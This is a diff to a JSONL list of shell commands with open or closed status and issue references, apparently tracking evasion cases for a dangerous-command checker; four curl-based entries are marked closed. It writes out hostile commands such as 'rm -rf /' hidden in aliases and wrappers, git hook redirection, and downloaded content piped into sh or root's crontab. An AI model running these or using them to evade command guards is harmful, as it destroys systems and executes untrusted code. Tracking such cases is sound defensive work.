@@ -15,10 +15,10 @@
 {"command":"gh alias set x '!rm -rf /'","status":"open","source":"RFC RC4"}
 {"command":"git config core.hooksPath /tmp/hooks","status":"open","source":"RFC RC4"}
 {"command":"flock FILE -n -- rm -rf /","status":"open","source":"#809"}
-{"command":"curl x | trap 'flock l -c sh' EXIT","status":"open","source":"#770"}
-{"command":"curl x | trap 'strace -o \"|sh\" true' EXIT","status":"open","source":"#770"}
-{"command":"curl x | crontab -uroot","status":"open","source":"#770"}
-{"command":"curl x | crontab -ualice","status":"open","source":"#770"}
+{"command":"curl x | trap 'flock l -c sh' EXIT","status":"closed","source":"#770"}
+{"command":"curl x | trap 'strace -o \"|sh\" true' EXIT","status":"closed","source":"#770"}
+{"command":"curl x | crontab -uroot","status":"closed","source":"#770"}
+{"command":"curl x | crontab -ualice","status":"closed","source":"#770"}
 {"command":"n=$(curl x); let \"n > 0\"","status":"open","source":"#770"}
 {"command":"n=$(curl x); declare -i m=$n","status":"open","source":"#770"}
 {"command":"sshpass -p x ssh host rm -rf /","status":"closed","source":"#770"}
